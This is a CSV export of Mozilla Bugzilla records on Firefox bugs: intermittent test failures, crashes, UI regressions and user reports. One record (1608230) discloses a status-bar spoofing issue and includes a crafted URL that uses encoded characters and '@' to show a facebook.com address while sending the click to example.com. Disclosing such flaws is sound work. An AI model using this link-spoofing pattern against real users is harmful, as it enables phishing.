1607892,"Intermittent TV browser/components/customizableui/test/browser_lwt_telemetry.js | Get more opened AMO - Got about:blank, expected about:blank#getMoreThemes",RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284062889&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/GVzNx9m2Qw-mNK7okcoQzQ/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/GVzNx9m2Qw-mNK7okcoQzQ/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 ---
1607893,Intermittent TV toolkit/components/normandy/test/browser/browser_RecipeRunner.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284060679&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Np4QTbGtR9WXTucmbJJr4w/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Np4QTbGtR9WXTucmbJJr4w/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- [task 2020-01-08T18:30:06.650Z] 18:30:06 INFO - TEST-START | toolkit/components/normandy/test/browser/browser_RecipeRunner.js [task 2020-01-08T18:30:52.322Z] 18:30:52 INFO - TEST-PASS | toolkit/components/normandy/test/browser/browser_RecipeRunner.js | run() is no-op if already running - [task 2020-01-08T18:30:52.322Z] 18:30:52 INFO - Leaving test bound testRunCanRunOnlyOnce [task 2020-01-08T18:30:52.322Z] 18:30:52 INFO - Entering test bound testSyncDelaysTimer [task 2020-01-08T18:30:52.323Z] 18:30:52 INFO - Console message: UTM:SVC TimerManager:unregisterTimer - id: recipe-client-addon-run [task 2020-01-08T18:30:52.323Z] 18:30:52 
1607894,"Intermittent normandy/test/browser/browser_RecipeRunner.js | recipes/all recipes with matching should have their signature verified - [] deepEqual [[{""name"":""match"",""action"":""matchAction"",""filter_expression"":""true""},{""signature"":""abc""},""",RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284050452&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Gky4q57EQbeyVZivuqTkwg/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Gky4q57EQbeyVZivuqTkwg/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 ---
1607912,Site Protection Cannot Be Overridden,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Tried to log into several my regular websites which worked fine in beta 73.0b1 but which don't in 73.0b2. example: zdnet.com or kroger.com Actual results: Totally blank screen with page source showing nothing. Your instructions tell me that I can click on the shield icon to override but the shield is not there on any of the malfunctioning pages. (there are several others that I know of) Expected results: Page should have been displayed but I got nada. Looking at the blocking stats page I see that today, after the new beta, there was a tremendous jump. Cannot find a way around it beyond using Chrome to access these pages."
1607925,{protections Report] Manage Protections button is incorrectly visible,RESOLVED,P1,FIXED,The manage Protections button in the ETP card should only be visible when a user is in custom and has turned off all protections.
1607927,Uncontrollable page scrolling after middle mouse click on <object>-embedded svg element,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Open the attached test-case which contains an <object>-embedded svg element in Firefox. Click on the blue area with the middle mouse button and try to scroll a bit. Terminate scrolling by clicking with the middle mouse button in the blue area again. This behaviour was noticed with the embedded svg flowcharts contained in https://www.onkopedia-guidelines.info/en/onkopedia/guidelines/chronic-lymphocytic-leukemia-cll/@@guideline/html/index.html Actual results: The scrolling behaviour becomes uncontrollable now. By just moving your mouse up and down, the page scrolls. Using the scroll bar will make the page scroll by itself back to the starting position. This behaviour can only be stopped by reloading the page. Expected results: Scrolling should stop after the second middle mouse click."
1607937,ExtensionSettings Policy's blocked_install_message does not always display,VERIFIED,P1,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: 1. Configure the ExtensionSettings policiy by way of the policies.json file in the C:\Program Files\Mozilla Firefox\distribution\ folder so that all extensions are blocked by default. ""ExtensionSettings"": { ""*"": { ""blocked_install_message"": ""Custom Message Still Needs to Go Here..."", ""install_sources"": [""https://addons.mozilla.org/""], ""installation_mode"": ""blocked"", ""allowed_types"": [""extension"", ""theme"", ""dictionary"", ""langpack""] } 2. Open about:addons and attempt to install an extension such Facebook Container. Actual results: Error message ""Firefox prevented this site from asking you to install software on your computer."" received. The installation was blocked, but our custom message was not displayed to alert the employee who blocked the installation and why. Expected results: Error message should have been the custom one that was specified in the policy. If attempting the installation from https://addons.mozilla.org/en-US/firefox/addon/facebook-container/?src=search, I receive the message I was expecting. ""Facebook Container (@contain-facebook) is blocked by your syste"
1607941,"Intermittent ccov toolkit/components/normandy/test/browser/browser_RecipeRunner.js | run() does not run again from timer - Got 3, expected 2",RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284091996&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/CctXUP1MRFan_fQwMr578A/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/CctXUP1MRFan_fQwMr578A/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 ---
1607942,Bookmarks corrupted < 1hr after being restored,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Just start Firefox, restore bookmarks from JSON file (because they're corrupted), wait a while (<1hr) and bookmarks corrupted again. By corrupted, I mean that they aren't what there were restored as - some entries are OK, some are missing. It's as if the bookmarks are being restored from a file/database somewhere. Actual results: See above Expected results: Bookmarks unchanged"
1607943,About Firefox text has line breaks in weird places,VERIFIED,--,DUPLICATE,"Steps to reproduce: 1. Go to Help > About Nightly What happens: Text has odd line breaks, making the window taller than wide and looks odd. 9:16.84 INFO: No more inbound revisions, bisection finished. 9:16.84 INFO: Last good revision: 29584a35d69ae2c8bb157702be402733fc0ce176 9:16.84 INFO: First bad revision: 23d862866f3a55716b89230e5440213ae56df178 9:16.84 INFO: Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=29584a35d69ae2c8bb157702be402733fc0ce176&tochange=23d862866f3a55716b89230e5440213ae56df178"
1607944,About Firefox window strange size,VERIFIED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: I can reproduce by following these steps: 1. Start Firefox 2. Open Help menu 3. Click About Nightly Actual results: About Firefox Nightly window is very large with strange text wrapping and line spacing Expected results: About Firefox Nightly window is normal size with normal text wrapping and normal line spacing
1607977,"Intermittent TV toolkit/components/normandy/test/browser/browser_RecipeRunner.js | RecipeRunner should report uptake telemetry - [[""success""],[""sign_error""]] deepEqual [[""sign_error""]] - JS frame :: chrome://mochitests/content/browser/toolkit/components/",RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284115980&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/We-mddM-Q12r4tI5GCvVsQ/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/We-mddM-Q12r4tI5GCvVsQ/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 ---
1607995,mozilla opens millions of new tabs,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Install firefox update or fresh install. 2. After the update when firefox goes to open itself like it does after an update it will instead repeatedly open new tabs as new windows. 3. Same with fresh install and I removed all firefox folders including all the appdata ones. 4. Restart computer, same results as soon as I double click firefox shortcut. Its been happening ever since v70. Im able to constantly reproduce it and i can reproduce this issue on another computer as well. I ran malware bytes to see maybe theres an infection came clean. I7 6700k with 32 gigs of ram. Also on current build of windows 10 pro 1909. Added exception for comodo as well. The other computer I tested on does not have comodo only difference is specs. Actual results: Firefox will constantly open new tabs and windows until it crashes exploere.exe Expected results: When I install new or update i should not see a million tabs open in new windows crashing exploere.exe"
1608005,"Intermittent browser/base/content/test/tabs/browser_multiselect_tabs_move_to_new_window_contextmenu.js | application terminated with exit code 1 | application crashed [@ CA::AttrList::get(unsigned int, _CAValueType, void*) const + 0xf]",RESOLVED,P5,DUPLICATE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284140512&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DzxluChVRmqUu1uMEj-ONA/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-09T04:22:40.129Z] 04:22:40 INFO - TEST-START | browser/base/content/test/tabs/browser_multiselect_tabs_move_to_new_window_contextmenu.js [task 2020-01-09T04:22:41.797Z] 04:22:41 INFO - GECKO(2019) | Exiting due to channel error. [task 2020-01-09T04:22:41.799Z] 04:22:41 INFO - GECKO(2019) | [GFX1-]: Receive IPC close with reason=AbnormalShutdown [task 2020-01-09T04:22:41.799Z] 04:22:41 INFO - GECKO(2019) | Exiting due to channel error. [task 2020-01-09T04:22:41.800Z] 04:22:41 INFO - GECKO(2019) | Exiting due to channel error. [task 2020-01-09T04:22:41.800Z] 04:22:41 INFO - GECKO(2019) | Exiting due to channel error. [task 2020-01-09T04:22:41.800Z] 04:22:41 INFO - GECKO(2019) | [GFX1-]: Receive IPC close with reason=AbnormalShutdown [task 2020-01-09T04:22:41.800Z] 04:22:41 INFO - GECKO(2019) | [GFX1-]: Receive IPC close with reason=AbnormalShutdown [task 2020-01-09T04:22:41.800Z] 04:22:41 INFO 
1608011,Sync telemetry isn't reporting the syncNodeType,VERIFIED,P1,FIXED,"Because I neglected to extract it from the tokenserver response :( [Tracking Requested - why for this release]: We really want telemetry which indicates what if a user is on the ""new"" sync storage node."
1608012,Firefox suggests opening downloaded files as file:// URI if explorer.exe isn't running as login shell,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: 1. Terminate explorer.exe and launch firefox; or use shell replacement such as bbLean. 2. Download a file, go to Downloads section, click on the downloaded file. Actual results: ""Launch Application"" dialog is shown, listing ""file link"" as a filetype. Expected results: File should open in the default application assigned by Windows."
1608036,Loss of all pinned tabs except one,VERIFIED,P1,FIXED,STR: Restart firefox. Observe all pinned tabs are gone except one. Very likely a regression from bug 1607441 which tried to fix the order reversal.
1608049,Auto-hide sidebar user style stopped working in Firefox 72,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Updates to Firefox 72.0.1 Actual results: Does not work this script: /* * Description: Auto-hide sidebar. */ /* To right-align the sidebar, replace all occurrences of ""left"" with ""right"", and ""margin-right"" with ""margin-left"" */ :root { --sidebar-hover-width: 10px; --sidebar-visible-width: 200px; } #sidebar-box { position: relative !important; overflow-x: hidden !important; margin-right: calc(var(--sidebar-hover-width) * -1) !important; left: var(--sidebar-hover-width) !important; min-width: var(--sidebar-hover-width) !important; max-width: var(--sidebar-hover-width) !important; border-right: 1px solid var(--sidebar-border-color); } #sidebar-box:hover { margin-right: calc(var(--sidebar-visible-width) * -1) !important; left: var(--sidebar-visible-width) !important; min-width: var(--sidebar-visible-width) !important; max-width: var(--sidebar-visible-width) !important; } #sidebar { opacity: 0 !important; } #sidebar-box:hover #sidebar { opacity: 1 !important; } /* #sidebar-header is hidden by default, change ""none"" to ""inherit"" to restore it. */ #sidebar-header { display: none"
1608070,Unable to open document with space in filename in external programs,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Open menu -> Options -> General -> Applications 2. Setup open pdf document in external application 3. Open document with space in name https://www.mass.gov/files/documents/2018/09/28/ID Documents Checklist_0918.pdf Actual results: PDF viewer starting, but screen is blank Expected results: The document must be open in the application. Similar behavior is observed for links type "".magnet"" and "".torrent"" The document without a space in the name (https://www.dps.texas.gov/internetforms/Forms/DL-15.pdf) opens correctly."
1608072,Library button is shifted if browser is minimized while the bookmarking animation is playing,RESOLVED,--,DUPLICATE,**Affected versions** * Fx 73.0b2 * Fx 74.0a1 **Affected platforms** * Windows 10x64 * MacOS 10.15 * Ubuntu 18.4 **Steps to reproduce** 1. Launch Firefox 2. Open any site that is not bookmarked 3. Maximize browser window 4. Click the star-shaped button from toolbar and minimize the browser 5. Repeat step 4. minimizing and maximizing the browser while the bookmark animations is playing 6. Observe the library icon **Expected result** * Toolbar buttons should be displayed properly **Actual result** * Library button is shifted if browser is minimized while the bookmarking animation is playing **Regression range** * Pushlog: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=6cbf1430a66ef5aa5f066ed77677f47ea44fc0e1&tochange=c221a75fbf2957b6254fedb96436b5efbf0fd147 * Potential regressor: https://bugzilla.mozilla.org/show_bug.cgi?id=1580538
1608073,Pages not loading after upgrade,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Steps to reproduce: on Fedora 31, I upgraded Firefox 70 to 72. When I opened Firefox, pages are not loading any more, I get a very quick loader icon then a white blank page. I tried with add-on disabled, same result Actual results: Blank White pages Expected results: Website(s) should be loaded"
1608106,[macOS] Disabled drag space label (ie when title bar is enabled) inside Customize page is barely visible with dark OS theme,VERIFIED,P3,FIXED,"[Affected versions]: - 72.0.1 - 73.0b2 - 74.0a1 (2020-01-07) [Affected platforms]: - macOS 10.14 - macOS 10.15 [Steps to reproduce]: 1. Open the Customize page (Menu - Customize) 2. Check the Title Bar options [Expected result]: - Drag Space options turns inactive, no visual issue can be observed [Actual result]: - Drag Space options turns inactive, but it is hardly visible [Regression range]: - I will provide one asap [Additional notes]: - Issue not reproducible with dark mode on Windows"
1608147,New windows no longer created with dark page when set to blank in dark mode.,NEW,P3,,"STR: 1. Set ""Homepage and new windows"" and ""New tabs"" to ""Blank Page"" or alternatively set the following: `browser.newtabpage.enabled = false` `browser.startup.homepage = about:blank` 2. Enable OS dark more or set `ui.systemUsesDarkTheme = 1`. 3. Create a new window. Expected: Page content is dark. Actual: Page content is white. Regression range: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=e3e2c1d7478e450e2b32c85c416ccf70f9de56d3&tochange=379a82fe25d90e023c9bbe1f3437d82c6c2914ff Regressed by Bug 1599544."
1608169,Investigate megabar expansion animation sluggishness,VERIFIED,P2,FIXED,Verdi and I recently noticed that the megabar visibly shrinks a bit before it expands. This seems to have looked better some time ago so this is possibly a regression.
1608209,Ctrl+H does not open History sidebar,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: -Open Firefox -Press Ctrl+H Actual results: Nothing Expected results: The History sidebar should appear. The Ctrl+H shortcut is displayed on View>Sidebar>History in the menu bar.
1608214,"big white screen, no outbound traffic",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open Firefox Developer Edition and typed www.google.com in the address bar. I'm using version 73.0b2. I tried: reinstalling deleting Mozilla AppData tons of online help like places.sqlite.old, hardware acceleration....and more. Nothing helps :( FFDE is my go to brower. Please help Actual results: Got a big white screen. typed www.google.com in the address bar...Nothing, not even a moving dot in the tab. restarted in Safe Mode, typed www.google.com in the address bar. This time a moving dot in the tab showed but www.google.com didn't appear. Expected results: www.google.com should've appeared. my crash report listed on the profiles page??? (bp-56792e10-a85c-4802-b052-62d200200109) also, opening Options doesn't even work unless I Restart in Safe Mode"
1608230,Status Bar spoofing using URL encoding and `@`,RESOLVED,P3,DUPLICATE,"Hello, When we move mouse on a link, its href(of that anchor tag) is shown in status bar which is used for anti-phishing. But we can spoof that status bar and can redirect vicitm to an external malicious website instead of shown website. This behavior may lead to phishing attacks. Steps to reproduce: 1. Use following as href of an anchor tag: https://www.facebook.com%2Flogin%3Ftestx=ZW5o%26dummy2=amJuaDZhbU42ZUc1cWRtdHVlbXA0YTJwMmJtcDRlbXR1ZG1wcmVuaHFhMjUyYW10NGJucHJkbTVxYTNodWFuWnJibnA0YW10MmJtdHVlR3R1ZG10dWVtcHJkbTVyYm5oNmRtdHVhM2g2Ym5acmJtcHJlbmh1ZG5wNGRucDRZMjU0ZW1wamVuaHVhblpyYm5wcWVHdHFkbTVxZUhwcmJuWnFhM3A0YW10dWRtcHJlRzU2YTNadWFtd[@example.com/]bZW5oamJuaDZhbU42ZUc1cWRtdHVlbXA0YTJwMmJtcDRlbmhqYm5oNmFtTjZlRzVxZG10dWVtcDRhMnAyYm1wNGVtdHVkbXByZW5ocWEyNTJhbXQ0Ym5wcmRtNXFhM2h1YW5acmJucDRhbXQyYm10dWVHdHVkbXR1ZW1wcmRtNXJibmg2ZG10dWEzaDZiblpyYm1wcmVuaHVkbnA0ZWc9PQ== 2. Move mouse on that link 3. In status bar, https://www.facebook.com/login?testx=... is shown but click on that link 4. You will be redirected to https://example.com without any warning 5. Done I have attached a PoC HTML file. `example.com` is not shown anywhere in status bar. Suggested Fix: As url redirects to example."
1608237,"#main-window does no longer contain ""title"" attribute",RESOLVED,--,WONTFIX,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open a remote debug session and inspect <html id=""#main-window"" xmls=[...]> Actual results: Only title_normal, title_privatebrowsing, ... are provided Expected results: Please re-add a #main-window label, stating the currently selected sites title. Since 72.x the current selected site title is only available within <title> element and later on in <tab> with && selected=true. As CSS does not provide element content matching (only attributes) the <title> content is not evaluable by css. FurthermoreCSS does neither provide child>parent accessors nor :has. So ""#navigator-toolbox"" and its childs are not accessible on matches of like #navigator-toolbox tab[label^=""New Tab""][selected=""true""]."
1608246,"""Saved Addresses..."" subdialog doesn't open if the window is too small",RESOLVED,--,FIXED,"STR: 1. Open about:preferences 2. Reduce the size of the Firefox window to be pretty small 3. Open any subdialog. I searched for the ""Saved Addresses..."" button and clicked it, but I believe I have seen this bug on other subdialogs too. Expected Results: The dialog opens Actual results: The dialog does not open. The console contains this error:`TypeError: contentPane is null (subdialogs.js:434:7)`"
1608255,Extension pop up panes and menu pain getting cut off,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: This issue is using Firefox on windows. No special steps for reproducing this issue. I tried restarting firefox without addons enabled and the issue still persists. Actual results: After a certain number of verticle pixels the pop-up pane contents are no longer visible or have to be scrolled. See attachments for further info. If the content is not scrollable (see second screenshot) then the content cannot be viewed at all. The screenshots of the issue are available here: https://imgur.com/a/orKiqH5
1608264,String problems on upgrade to 72,RESOLVED,--,WORKSFORME,From https://www.reddit.com/r/firefox/comments/emd9fj/firefox_update_7201_problems/ There seems to be missing strings for the PIP toggle and other areas of Firefox. User says they started to see this on update. See screenshots.
1608303,"Intermittent browser/components/protections/test/browser/browser_protections_report_ui.js | Tracker Label is hidden - false == true - got false, expected true (operator ==)",RESOLVED,P5,DUPLICATE,"**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284270722&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/G-F5e1ivSc2xQxlZhhmZqw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-09T22:10:38.191Z] 22:10:38 INFO - TEST-PASS | browser/components/protections/test/browser/browser_protections_report_ui.js | Fingerprinter Label is visible - true == true - [task 2020-01-09T22:10:38.191Z] 22:10:38 INFO - Console message: [JavaScript Error: ""There was an error fetching the user's token: "" {file: ""resource:///modules/aboutpages/AboutProtectionsHandler.jsm"" line: 279}] [task 2020-01-09T22:10:38.191Z] 22:10:38 INFO - getMonitorScopedOAuthToken@resource:///modules/aboutpages/AboutProtectionsHandler.jsm:279:10 [task 2020-01-09T22:10:38.191Z] 22:10:38 INFO - async*getMonitorData@resource:///modules/aboutpages/AboutProtectionsHandler.jsm:213:28 [task 2020-01-09T22:10:38.192Z] 22:10:38 INFO - receiveMessage@resource:///modules/aboutpages/AboutProtectionsHandler.jsm:395:22 [task 2020-01-09T22:10:38.192Z] 22:10:38 INFO - callListeners@resource://gre/modules/remotepagemanager/MessagePor"
1608345,Intermittent browser/base/content/test/pageinfo/browser_pageinfo_security.js | application crashed [@ nsAutoOwningThread::AssertCurrentThreadOwnsMe(char const*) const],RESOLVED,P5,INCOMPLETE,**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284278078&repo=mozilla-esr68 **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/SiogblurTyCMKEFa6spzfg/runs/0/artifacts/public/logs/live_backing.log --- >22:46:16 INFO - PROCESS-CRASH | browser/base/content/test/pageinfo/browser_pageinfo_security.js | application crashed [@ nsAutoOwningThread::AssertCurrentThreadOwnsMe(char const*) const] 22:46:16 INFO - Crash dump filename: /var/folders/zw/mmbv0s5d50n822d37hlf1wqh000017/T/tmpAGbbxa.mozrunner/minidumps/472FD784-E1F8-4EE6-9D0D-5360E6C9069F.dmp 22:46:16 INFO - Operating system: Mac OS X 22:46:16 INFO - 10.14.5 18F132 22:46:16 INFO - CPU: amd64 22:46:16 INFO - family 6 model 69 stepping 1 22:46:16 INFO - 4 CPUs 22:46:16 INFO - 22:46:16 INFO - GPU: UNKNOWN 22:46:16 INFO - 22:46:16 INFO - Crash reason: EXC_BAD_ACCESS / KERN_INVALID_ADDRESS 22:46:16 INFO - Crash address: 0x0 22:46:16 INFO - Process uptime: 28 seconds 22:46:16 INFO - 22:46:16 INFO - Thread 60 (crashed) 22:46:16 INFO - 0 XUL!nsAutoOwningThread::AssertCurrentThreadOwnsMe(char const*) const [nsISupportsImpl.cpp:008191a25c1234573e52fc05cde362bc
1608348,Default Zoom Text Only option set in about:preferences does not work,VERIFIED,P1,FIXED,"#### Affected versions: Nightly 74.0a1 (2020-01-10), Beta 73.0b3 #### Affected platforms: ALL #### Steps: 1. Launch Firefox with a new profile and go to about:preferences. 2. Under General, go to Zoom section, check the ""Zoom text only"" checkbox and select any value from the ""Default zoom"" dropdown. 3. Access any website that contains text strings and photos. #### Actual result: The default zoom level is applied to entire content of the page. #### Expected result: Default zoom level should be applied just for text only."
1608381,"The value of the ""browser.messaging-system.personalized-cfr.score"" pref is not updated on the ""Treatment"" branch",VERIFIED,--,FIXED,"**[Notes]:** - After further investigation, we found out that there is a difference between the bucket name from the [add-on source code](https://github.com/mozilla/messaging-system-personalization-experiment-1-addon/blob/v1.0.0/src/background.js) and the bucket name from the ""[Remote Settings Server](https://settings.stage.mozaws.net/v1/buckets/main/collections)"". More exactly the add-on targets the ""cfr-ml-model"" bucket collection but on the server, the bucket collection is named ""cfr-ml-models"". **[Affected versions]:** - Firefox Release 72.0.1 - Build ID: 20200107212822 - Firefox Beta 73.0b2 - Build ID: 20200107212705 - Firefox Nightly 74.0a1 - Build ID: 20200109213942 **[Affected Platforms]:** - Windows 10 x64 - Mac 10.15.2 - Ubuntu 18.04 x64 **[Prerequisites]:** - Have the environment set to ""Stage"" using the latest version of the ""Remote Settings Devtools"" add-on from [here](https://github.com/mozilla/remote-settings-devtools/releases/download/1.2.0/remote-settings-devtools@mozilla.com-1.2.0-signed.xpi). - Have a Firefox profile with the following preferences set in the ""about:config"" page: - ""extensions.messaging-system-personalization-experiment-1.test.scoringBehaviorOverr"
1608393,Firefox is consuming more memory while running for long,VERIFIED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: 1. We have run performance test suite for 8 hrs 2. We collected multiple heapdumps for internal 3. compared the heapdumps Actual results: Report class instance have gradually increased during the test and memory consumed by these classes has increased beyond 20MB. Expected results: Since GC happens regularly during test in progress, the memory consumed by these classes should be claimed/released back to free memory, but report class is holding the reference for longer period of time without they are being used hence the ye are culprits for memory leak."
1608429,Intermittent browser/modules/test/browser/browser_TabUnloader.js | low-memory memory-pressure notification unloaded the LRU tab -,RESOLVED,P5,INCOMPLETE,**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284388114&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/dSRC8jXqRBacwuaAK9wipg/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-10T12:51:53.112Z] 12:51:53 INFO - TEST-PASS | browser/modules/test/browser/browser_TabUnloader.js | tabs are present - [task 2020-01-10T12:51:53.112Z] 12:51:53 INFO - TEST-PASS | browser/modules/test/browser/browser_TabUnloader.js | heap-minimize memory-pressure notification did not unload a tab - [task 2020-01-10T12:51:53.112Z] 12:51:53 INFO - Buffered messages finished [task 2020-01-10T12:51:53.112Z] 12:51:53 INFO - TEST-UNEXPECTED-FAIL | browser/modules/test/browser/browser_TabUnloader.js | low-memory memory-pressure notification unloaded the LRU tab - [task 2020-01-10T12:51:53.113Z] 12:51:53 INFO - Stack trace: [task 2020-01-10T12:51:53.113Z] 12:51:53 INFO - chrome://mochikit/content/browser-test.js:test_ok:1292 [task 2020-01-10T12:51:53.113Z] 12:51:53 INFO - chrome://mochitests/content/browser/browser/modules/test/browser/browser_TabUnloader.js:test:89 [task 2020-01-10T12:51:53.113Z] 1
1608435,Nightly messes up pinned tabs,RESOLVED,--,DUPLICATE,Mozilla/5.0 (Windows NT 6.1; rv:74.0) Gecko/20100101 Firefox/74.0 Build ID 20200109094415 1) Open Nightly 2) Notice most pinned tabs are missing and the ones left are not in the correct order Actual behavior Most pinned tabs are missing and the ones left are not in the correct order Expected behavior All pinned tabs should open in the correct order and no pinned tabs should be missing
1608455,"Intermittent browser/components/sessionstore/test/browser_formdata_cc.js | numbers that are not valid CC numbers are still collected - Got 379761391174135, expected 030551436468583",RESOLVED,P5,INCOMPLETE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284404525&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/aV16GtDYR9S3WiZZCBpJcA/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - TEST-PASS | browser/components/sessionstore/test/browser_formdata_cc.js | numbers that are not valid CC numbers are still collected - [task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - Console message: SessionStore: [process-switch]: currentRemoteType (web) preferredRemoteType: web [task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - Console message: SessionStore: [process-switch]: web, web, false [task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - Console message: SessionStore: [process-switch]: type (web) is compatible - ignoring [task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - Console message: SessionStore: [process-switch]: remote subframes disabled - ignoring [task 2020-01-10T14:24:15.107Z] 14:24:15 INFO - TEST-PASS | browser/components/sessionstore/test/browser_formdata_cc.js | numbers that are not valid CC numbers are still collected - [task 2020-01-10T14:24:15.1"
1608465,Not all Menu titles appear in Firefox window that is opened when clicking on link in emails.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I click on a link to a website in my email. (I use Apple's Mail.) Actual results: Two Firefox windows open. The first is a new tab...and all menu items appear. The second contains the site that I want to visit. However only the Apple icon and ""Firefrox"" appear on the menu. I can select other menu items but can't see the titles. Options appear based on what's selected. See attached screen shot. Expected results: Only one window should open; it should contain the site I want to visit; and all menu items should appear."
